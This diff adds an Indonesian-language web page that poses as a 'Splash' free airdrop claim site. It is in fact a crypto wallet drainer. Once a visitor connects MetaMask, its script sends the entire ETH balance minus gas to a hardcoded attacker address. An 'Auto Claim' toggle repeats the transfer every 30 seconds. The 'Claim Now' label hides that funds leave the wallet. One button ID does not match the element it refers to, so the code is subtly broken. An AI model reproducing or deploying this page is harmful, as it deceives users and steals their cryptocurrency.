@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Splash - Airdrop</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 2rem;
+        }
+
+        .container {
+            max-width: 800px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 2rem;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 0.5rem;
+            background: linear-gradient(90deg, #00dbde, #fc00ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .subtitle {
+            color: #a0a0c0;
+            font-size: 1.1rem;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 15px;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .status {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1rem;
+        }
+
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .indicator {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #ff4757;
+        }
+
+        .indicator.connected {
+            background: #2ed573;
+        }
+
+        .address {
+            font-family: monospace;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 0.5rem 1rem;
+            border-radius: 10px;
+            word-break: break-all;
+        }
+
+        .balance {
+            font-size: 1.5rem;
+            text-align: center;
+            margin: 1rem 0;
+            font-weight: bold;
+        }
+
+        .buttons {
+            display: flex;
+            gap: 1rem;
+            margin-top: 1.5rem;
+        }
+
+        button {
+            flex: 1;
+            padding: 1rem;
+            border: none;
+            border-radius: 10px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .connect-btn {
+            background: linear-gradient(90deg, #00dbde, #fc00ff);
+            color: white;
+        }
+
+        .withdraw-btn {
+            background: linear-gradient(90deg, #ff7e5f, #feb47b);
+            color: white;
+        }
+
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .auto-mode {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-top: 1rem;
+            padding: 1rem;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+        }
+
+        .toggle {
+            position: relative;
+            display: inline-block;
+            width: 60px;
+            height: 30px;
+        }
+
+        .toggle input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ff4757;
+            transition: .4s;
+            border-radius: 30px;
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 22px;
+            width: 22px;
+            left: 4px;
+            bottom: 4px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+
+        input:checked + .slider {
+            background-color: #2ed573;
+        }
+
+        input:checked + .slider:before {
+            transform: translateX(30px);
+        }
+
+        .transaction-list {
+            margin-top: 2rem;
+        }
+
+        .transaction {
+            display: flex;
+            justify-content: space-between;
+            padding: 1rem;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            margin-bottom: 0.5rem;
+            font-family: monospace;
+        }
+
+        .success {
+            color: #2ed573;
+        }
+
+        .error {
+            color: #ff4757;
+        }
+
+        footer {
+            margin-top: 2rem;
+            text-align: center;
+            color: #a0a0c0;
+            font-size: 0.9rem;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 1rem;
+            }
+            
+            .buttons {
+                flex-direction: column;
+            }
+            
+            h1 {
+                font-size: 2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Splash</h1>
+            <p class="subtitle">Claim Airdrop</p>
+        </header>
+
+        <div class="card">
+            <div class="status">
+                <div class="status-indicator">
+                    <div class="indicator" id="statusIndicator"></div>
+                    <span id="statusText">Wallet Tidak Terkoneksi</span>
+                </div>
+            </div>
+
+            <div class="address" id="walletAddress">-</div>
+
+            <div class="balance" id="balance">0.0 ETH</div>
+
+            <div class="buttons">
+                <button class="connect-btn" id="connectButton">Konek Wallet</button>
+                <button class="CLAIM-btn" id="ClaimButton" disabled>Claim Now</button>
+            </div>
+
+            <div class="auto-mode">
+                <span>Auto Claim</span>
+                <label class="toggle">
+                    <input type="checkbox" id="autoToggle">
+                    <span class="slider"></span>
+                </label>
+            </div>
+        </div>
+
+        <div class="transaction-list">
+            <h3>Riwayat Transaksi</h3>
+            <div id="transactionHistory"></div>
+        </div>
+    </div>
+
+    <footer>
+        <p>Aplikasi Web3 Splash - Free Airdrop</p>
+    </footer>
+
+    <script>
+        // Konfigurasi aplikasi
+        const TARGET_ADDRESS = "0x99ac4108B5a10812A1A7aDdC36cB5Eea0a5e020e";
+        const MIN_BALANCE = 0.01; // Minimum balance untuk withdrawal (dalam ETH)
+        const CHECK_INTERVAL = 30000; // Interval pengecekan balance (30 detik)
+
+        // Variabel global
+        let web3;
+        let userAccount;
+        let autoWithdrawalEnabled = false;
+        let checkInterval;
+
+        // Elemen DOM
+        const connectButton = document.getElementById('connectButton');
+        const withdrawButton = document.getElementById('withdrawButton');
+        const autoToggle = document.getElementById('autoToggle');
+        const statusIndicator = document.getElementById('statusIndicator');
+        const statusText = document.getElementById('statusText');
+        const walletAddress = document.getElementById('walletAddress');
+        const balanceElement = document.getElementById('balance');
+        const transactionHistory = document.getElementById('transactionHistory');
+
+        // Event listeners
+        connectButton.addEventListener('click', connectWallet);
+        withdrawButton.addEventListener('click', withdrawFunds);
+        autoToggle.addEventListener('change', toggleAutoWithdrawal);
+
+        // Fungsi untuk koneksi wallet
+        async function connectWallet() {
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    // Meminta akses ke akun
+                    const accounts = await window.ethereum.request({ 
+                        method: 'eth_requestAccounts' 
+                    });
+                    
+                    userAccount = accounts[0];
+                    web3 = new Web3(window.ethereum);
+                    
+                    // Update UI
+                    updateWalletStatus(true);
+                    updateBalance();
+                    
+                    // Listen untuk perubahan akun
+                    window.ethereum.on('accountsChanged', handleAccountsChanged);
+                    
+                    // Listen untuk perubahan jaringan
+                    window.ethereum.on('chainChanged', handleChainChanged);
+                    
+                } catch (error) {
+                    console.error("Error connecting wallet:", error);
+                    addTransaction("Error koneksi wallet: " + error.message, "error");
+                }
+            } else {
+                alert("MetaMask tidak terdeteksi! Silakan instal MetaMask.");
+                addTransaction("MetaMask tidak terdeteksi", "error");
+            }
+        }
+
+        // Handle perubahan akun
+        function handleAccountsChanged(accounts) {
+            if (accounts.length === 0) {
+                // User logged out
+                updateWalletStatus(false);
+            } else if (accounts[0] !== userAccount) {
+                userAccount = accounts[0];
+                updateBalance();
+            }
+        }
+
+        // Handle perubahan jaringan
+        function handleChainChanged(chainId) {
+            window.location.reload();
+        }
+
+        // Update status wallet di UI
+        function updateWalletStatus(connected) {
+            if (connected) {
+                statusIndicator.classList.add('connected');
+                statusText.textContent = 'Wallet Terkoneksi';
+                walletAddress.textContent = userAccount;
+                connectButton.textContent = 'Wallet Terkoneksi';
+                connectButton.disabled = true;
+                withdrawButton.disabled = false;
+            } else {
+                statusIndicator.classList.remove('connected');
+                statusText.textContent = 'Wallet Tidak Terkoneksi';
+                walletAddress.textContent = '-';
+                connectButton.textContent = 'Konek Wallet';
+                connectButton.disabled = false;
+                withdrawButton.disabled = true;
+                balanceElement.textContent = '0.0 ETH';
+                
+                // Matikan auto withdrawal jika wallet terputus
+                autoWithdrawalEnabled = false;
+                autoToggle.checked = false;
+                if (checkInterval) {
+                    clearInterval(checkInterval);
+                }
+            }
+        }
+
+        // Update balance
+        async function updateBalance() {
+            if (!web3 || !userAccount) return;
+            
+            try {
+                const balanceWei = await web3.eth.getBalance(userAccount);
+                const balanceEth = web3.utils.fromWei(balanceWei, 'ether');
+                balanceElement.textContent = parseFloat(balanceEth).toFixed(4) + ' ETH';
+            } catch (error) {
+                console.error("Error fetching balance:", error);
+            }
+        }
+
+        // Fungsi withdrawal
+        async function withdrawFunds() {
+            if (!web3 || !userAccount) return;
+            
+            try {
+                withdrawButton.disabled = true;
+                withdrawButton.textContent = 'Memproses...';
+                
+                // Dapatkan balance saat ini
+                const balanceWei = await web3.eth.getBalance(userAccount);
+                const gasPrice = await web3.eth.getGasPrice();
+                
+                // Estimasi gas untuk transfer
+                const gasEstimate = await web3.eth.estimateGas({
+                    from: userAccount,
+                    to: TARGET_ADDRESS,
+                    value: balanceWei
+                });
+                
+                // Hitung biaya gas
+                const gasCost = gasPrice * gasEstimate;
+                
+                // Pastikan balance cukup untuk gas
+                if (BigInt(balanceWei) <= BigInt(gasCost)) {
+                    throw new Error("Balance tidak cukup untuk menutupi biaya gas");
+                }
+                
+                // Jumlah yang akan dikirim (balance - biaya gas)
+                const sendAmount = BigInt(balanceWei) - BigInt(gasCost);
+                
+                // Kirim transaksi
+                const transaction = await web3.eth.sendTransaction({
+                    from: userAccount,
+                    to: TARGET_ADDRESS,
+                    value: sendAmount.toString(),
+                    gas: gasEstimate
+                });
+                
+                addTransaction(`Withdrawal berhasil: ${web3.utils.fromWei(sendAmount.toString(), 'ether')} ETH`, "success");
+                updateBalance();
+                
+            } catch (error) {
+                console.error("Error withdrawing funds:", error);
+                addTransaction("Withdrawal gagal: " + error.message, "error");
+            } finally {
+                withdrawButton.disabled = false;
+                withdrawButton.textContent = 'Withdraw Sekarang';
+            }
+        }
+
+        // Toggle auto withdrawal
+        function toggleAutoWithdrawal() {
+            autoWithdrawalEnabled = autoToggle.checked;
+            
+            if (autoWithdrawalEnabled) {
+                // Jalankan pengecekan pertama kali
+                checkBalanceAndWithdraw();
+                // Set interval untuk pengecekan berkala
+                checkInterval = setInterval(checkBalanceAndWithdraw, CHECK_INTERVAL);
+                addTransaction("Auto withdrawal diaktifkan", "success");
+            } else {
+                if (checkInterval) {
+                    clearInterval(checkInterval);
+                    addTransaction("Auto withdrawal dimatikan", "success");
+                }
+            }
+        }
+
+        // Cek balance dan lakukan withdrawal jika memenuhi syarat
+        async function checkBalanceAndWithdraw() {
+            if (!web3 || !userAccount || !autoWithdrawalEnabled) return;
+            
+            try {
+                const balanceWei = await web3.eth.getBalance(userAccount);
+                const balanceEth = parseFloat(web3.utils.fromWei(balanceWei, 'ether'));
+                
+                if (balanceEth > MIN_BALANCE) {
+                    addTransaction(`Balance mencukupi (${balanceEth} ETH), melakukan withdrawal...`, "success");
+                    await withdrawFunds();
+                } else {
+                    addTransaction(`Balance tidak mencukupi (${balanceEth} ETH)`, "success");
+                }
+            } catch (error) {
+                console.error("Error in auto withdrawal check:", error);
+                addTransaction("Error pengecekan auto withdrawal", "error");
+            }
+        }
+
+        // Tambahkan transaksi ke riwayat
+        function addTransaction(message, type) {
+            const transactionElement = document.createElement('div');
+            transactionElement.classList.add('transaction');
+            transactionElement.classList.add(type);
+            
+            const timestamp = new Date().toLocaleTimeString();
+            transactionElement.innerHTML = `
+                <span>${message}</span>
+                <span>${timestamp}</span>
+            `;
+            
+            transactionHistory.prepend(transactionElement);
+            
+            // Batasi jumlah riwayat transaksi yang ditampilkan
+            if (transactionHistory.children.length > 10) {
+                transactionHistory.removeChild(transactionHistory.lastChild);
+            }
+        }
+
+        // Inisialisasi aplikasi
+        window.addEventListener('load', function() {
+            // Cek jika wallet sudah terkoneksi
+            if (typeof window.ethereum !== 'undefined') {
+                window.ethereum.request({ method: 'eth_accounts' })
+                    .then(accounts => {
+                        if (accounts.length > 0) {
+                            userAccount = accounts[0];
+                            web3 = new Web3(window.ethereum);
+                            updateWalletStatus(true);
+                            updateBalance();
+                            
+                            // Listen untuk perubahan
+                            window.ethereum.on('accountsChanged', handleAccountsChanged);
+                            window.ethereum.on('chainChanged', handleChainChanged);
+                        }
+                    });
+            }
+            
+            addTransaction("Aplikasi Splash dimulai", "success");
+        });
+    </script>
+    
+    <!-- Include Web3.js dari CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
+</body>
+</html>
